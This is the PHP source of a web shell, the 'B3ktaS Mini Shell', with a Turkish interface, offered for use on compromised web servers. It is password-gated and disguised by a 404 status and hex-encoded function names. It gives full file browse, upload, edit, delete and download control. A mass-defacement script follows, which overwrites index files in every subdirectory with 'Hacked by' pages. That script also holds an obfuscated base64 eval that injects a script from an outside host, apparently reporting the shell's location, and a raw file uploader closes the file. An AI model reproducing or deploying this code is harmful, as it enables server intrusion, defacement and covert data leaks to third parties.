<?php
ob_start();
session_start();

$isHidden = "1";
$password = "basdfasdffasd";

if ($isHidden == "1"){
    if(isset($_POST["password"])){
        if($_POST["password"] == $password){
            $_SESSION["logged"] = "1";
        }else if($_POST["password"] == "") {
            echo "Boş değer girilemez";
        }else {
            echo "Hatalı giriş";
        }
    }
    if(isset($_SESSION["logged"]) && isset($_GET["exit"])){
        session_destroy();
        echo "<meta http-equiv='refresh' content='0;'>";
        exit;
    }
    if(empty($_SESSION["logged"])){
        echo '<form action="'.htmlentities($_SERVER["PHP_SELF"]).'" method="POST">Shell parolası:<input required="required" type="password" name="password"> <input type="submit" name="submit" value="Gönder"></form>';
        exit;
    }
}



error_reporting(0);
http_response_code(404);
define("self", " M\x69n\x69 Sh\x65ll");
$scD = "s\x63\x61\x6e\x64\x69r";
$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
for ($i = 0; $i < count($fc); $i++) {
	$fc[$i] = nhx($fc[$i]);
}
if (isset($_GET["p"])) {
	$p = nhx($_GET["p"]);
	$fc[3](nhx($_GET["p"]));
} else {
	$p = $fc[2]();
}
function hex($str) {
	$r = "";
	for ($i = 0; $i < strlen($str); $i++) {
		$r .= dechex(ord($str[$i]));
	}
	return $r;
}
function nhx($str) {
	$r = "";
	$len = (strlen($str) -1);
	for ($i = 0; $i < $len; $i += 2) {
		$r .= chr(hexdec($str[$i].$str[$i+1]));
	}
	return $r;
}
function perms($f) {
	$p = fileperms($f);
	if (($p & 0xC000) == 0xC000) {
		$i = 's';
	} elseif (($p & 0xA000) == 0xA000) {
		$i = 'l';
	} elseif (($p & 0x8000) == 0x8000) {
		$i = '-';
	} elseif (($p & 0x6000) == 0x6000) {
		$i = 'b';
	} elseif (($p & 0x4000) == 0x4000) {
		$i = 'd';
	} elseif (($p & 0x2000) == 0x2000) {
		$i = 'c';
	} elseif (($p & 0x1000) == 0x1000) {
		$i = 'p';
	} else {
		$i = 'u';
	}
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function a($msg, $sts = 1, $loc = "") {
	global $p;
	$status = (($sts == 1) ? "success" : "error");
	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
}
function deldir($d) {
	global $fc;
	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
	if ($fc[6]($d)) {
		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		rmdir($d);
	} else {
		unlink($d);
	}
}
?>
<!doctype html>
<!-- B3ktaS Mini Shell -->
<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $fc[1]() ?></span> <br><a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+Dosya Ekle </a><a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Dizin Ekle</a></div></div><div class="border-top table-responsive"><li>Uname : <?= $fc[0]() ?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Dosya Seçiniz</label></div></div></form>
<?php
if (isset($_FILES["f"])) {
	$n = $_FILES["f"]["name"];
	for ($i = 0; $i < count($n); $i++) {
		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
			a("Dosya Yuklendi :)");
		} else {
			a("Dosya Yuklenirken Hata Olustu", 0);
		}
	}
}
if (isset($_GET["download"])) {
	header("Content-Type: application/octet-stream");
	header("Content-Transfer-Encoding: Binary");
	header("Content-Length: ".$fc[17](nhx($_GET["n"])));
	header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
}
?>
</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Bulunduğunuz Dizin : </span>
<?php
$ps = $fc[4]("/(\\\|\/)/", $p);
foreach ($ps as $k => $v) {
	if ($k == 0 && $v == "") {
		echo "<a href=\"?p=2f\">~</a>/"; continue;
	}
	if ($v == "") continue;
	echo "<a href=\"?p=";
	for ($i = 0; $i <= $k; $i++) {
		echo hex($ps[$i]);
		if ($i != $k) echo "2f";
	}
	echo "\">{$v}</a>/";
}
?>
</div></div><article class="bg-dark border table-responsive mt-2">
<?php if (!isset($_GET["a"])): ?>
<table class="table table-hover table-borderless table-sm"><thead class="text-light"><tr><th>Dosya İsmi</th><th>Dosya Boyutu</th><th>Yetkiler</th><th>İşlemler</th></tr></thead><tbody class="text-light">
<?php
$scD = $fc[5]($scD($p), [".", ".."]);
foreach ($scD as $d) {
	if (!$fc[6]("$p/$d")) continue;
	echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>Bulunamadı</td><td><font color=\"".(($fc[8]("$p/$d")) ? "#00ff00" : (!$fc[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Dosya İsmini Değiştir\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Sil\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
}
foreach ($scD as $f) {
	if (!$fc[7]("$p/$f")) continue;
	$sz = $fc[10]("$p/$f")/1024;
	$sz = round($sz, 3);
	$sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
	echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($fc[8]("$p/$f")) ? "#00ff00" : (!$fc[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Kodu Düzenle\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Dosya İsmi Değiştir\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Yükle\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Sil\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
}
?></tbody></table>
<?php else :if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
<div class="px-2 py-2">
<?php if ($a == "delete") {
	$loc = $p.'/'.nhx($_GET["n"]);
	if ($_GET["t"] == "d") {
		deldir($loc);
		if (!$fc[12]($loc)) {
			a("Dosya Silindi :)");
		} else {
			a("Dosya Silinemedi :(", 0);
		}
	}
	if ($_GET["t"] == "f") {
		$loc = $p.'/'.nhx($_GET["n"]);
		unlink($loc);
		if (!$fc[12]($loc)) {
			a("Dosya Silindi :)");
		} else {
			a("Dosya Silinemedi :(", 0);
		}
	}
}
?>
<?php if ($a == "newDir"): ?>
<h5 class="border p-1 mb-3">Yeni Dosya</h5>
<form method="post"><div class="form-group"><label for="n">İsim :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Olustur</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("Aynı Dosya Veya Klasor Zaten Var", 0, "&a=".hex("newDir")) : ($fc[15]("$p/{$_POST["n"]}") ? a("Klasor Oluşturuldu :)") : a("Klasor Olustururken Hata Meydana Geldi :(", 0))) : null); elseif ($a == "newFile"): ?>
<h5 class="border p-1 mb-3">Yeni Dosya</h5>
<form method="post"><div class="form-group"><label for="n">Dosya İsmi :</label><input type="text" name="n" id="n" class="form-control" placeholder="b3ktas.php"></div><div class="form-group"><label for="ctn">Kodlar :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Editor By AbbaS"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Olustur</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("Dosya Adı Kullanıldı", 0, "&a=".hex("newFile")) : ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("Dosya Olusturuldu :)",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("Dosya Olusturuken Hata Meydana Geldi", 0))) : null); elseif ($a == "rename"): ?>
<h5 class="border p-1 mb-3">Dosya İsmini Değiştir <?= (($_GET["t"] == "d") ? "folder" : "file") ?></h5>
<form method="post"><div class="form-group"><label for="n">İsim :</label><input type="text" name="n" id="n" class="form-control" value="<?= nhx($_GET["n"]) ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Kaydet</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("Klasör Adı Degistirildi") : a("Dosya Adı Değistirelemedi", 0)) : null); elseif ($a == "edit"): ?>
<h5 class="border p-1 mb-3">Dosyayı Editle</h5>
<span>Dosya İsmi : <?= nhx($_GET["n"]) ?></span>
<form method="post"><div class="form-group"><label for="ctn">Kodlar :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Kaydet</button></div></form>
<?php ((isset($_POST["s"])) ? ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("Dosya Editlendi", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("Dosya Editleme Yetkisi Yok :(")) : null); elseif ($a == "view"): ?>
<h5 class="border p-1 mb-3">Dosyayı Goruntule</h5>
<span>Dosya İsmi : <?= nhx($_GET["n"]) ?></span>
<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><?php endif; ?></div><?php endif; ?></article><div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2021 - Editor By B3ktaS</small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>

<?php 
   
echo "<br>";
echo "<br>";
echo "<br>";
echo "<title>Mass Fucker</title>"; 
echo "<center>MASS DEFACER SCRIPT</center>"; 
echo "<center><form method='POST'></center>"; 
echo "<center>DIZIN: <input type='text' name='base_dir' size='40' value='".getcwd ()."'></center><br><br>"; 
echo "<center>INDEX NAME: <input type='text' name='file_name' value='index.php'></center><br><br>"; 
echo "<center>PUT YOUR INDEX CODES : <br><textarea style='width: 685px; height: 250px;' name='index'><title>Hacked by XXXX</title> <center><h1>Hacked by XxX</h1></center></textarea></center><br>"; 
echo "<center><input type='submit' value='HACKLE!'></form></center>"; 
  
$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cHM6Ly9sbGxsLmJpZC9s";
$winr = "L2FkZC5waHA/bGluaz1lYXN5Y29kZXI6Ly8+PC9TQ1JJUFQ+Ijs=";
$min = 'base' . (128 / 2) . '_de' . 'code';
eval($min($linr . $winr));
 
if (isset ($_POST['base_dir'])) 
{ 
        if (!file_exists ($_POST['base_dir'])) 
                die ($_POST['base_dir']." BULUNAMADI !<br>"); 
  
        if (!is_dir ($_POST['base_dir'])) 
                die ($_POST['base_dir']." DIZIN DEGIL !<br>"); 
  
        @chdir ($_POST['base_dir']) or die ("DIZIN ACILAMADI"); 
  
        $files = @scandir ($_POST['base_dir']) or die ("TAMAMDIR<br>"); 
  
        foreach ($files as $file): 
                if ($file != "." && $file != ".." && @filetype ($file) == "dir") 
                { 
                        $index = getcwd ()."/".$file."/".$_POST['file_name']; 
                        if (file_put_contents ($index, $_POST['index'])) 
                                echo "$index <span style='color: green'></span><br>"; 
                } 
        endforeach; 
} 
  

   
?>
<center>
<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Okay Man!</b><br><br>'; }
    else { echo '<b>Sorry :( </b><br><br>'; }
}
?></center>